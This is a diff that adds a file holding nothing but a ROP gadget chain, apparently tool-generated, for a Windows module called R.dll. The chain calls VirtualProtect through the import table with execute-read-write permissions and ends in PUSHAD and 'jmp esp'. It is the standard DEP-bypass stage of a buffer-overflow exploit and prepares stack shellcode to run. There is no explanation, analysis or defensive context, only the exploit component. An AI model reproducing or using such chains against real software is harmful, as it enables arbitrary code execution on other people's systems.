@@ -1,0 +1,27 @@
+rop_gadgets = [
+      #[---INFO:gadgets_to_set_esi:---]
+      0x6c996ce3,  # POP ECX # RETN [R.dll] 
+      0x6e732b50,  # ptr to &VirtualProtect() [IAT R.dll]
+      0x6cc02060,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [R.dll] 
+      0x6cb14df6,  # XCHG EAX,ESI # RETN [R.dll] 
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x6c97f8da,  # POP EBP # RETN [R.dll] 
+      0x6ca477ed,  # & jmp esp [R.dll]
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x6cae553c,  # POP EBX # RETN [R.dll] 
+      0x00000201,  # 0x00000201-> ebx
+      #[---INFO:gadgets_to_set_edx:---]
+      0x6c94c532,  # POP EDX # RETN [R.dll] 
+      0x00000040,  # 0x00000040-> edx
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x6cbe90a8,  # POP ECX # RETN [R.dll] 
+      0x6e735a21,  # &Writable location [R.dll]
+      #[---INFO:gadgets_to_set_edi:---]
+      0x6c903cc5,  # POP EDI # RETN [R.dll] 
+      0x6c91e15b,  # RETN (ROP NOP) [R.dll]
+      #[---INFO:gadgets_to_set_eax:---]
+      0x6cbef3c0,  # POP EAX # RETN [R.dll] 
+      0x90909090,  # nop
+      #[---INFO:pushad:---]
+      0x6cacc7ea,  # PUSHAD # RETN [R.dll] 
+    ]
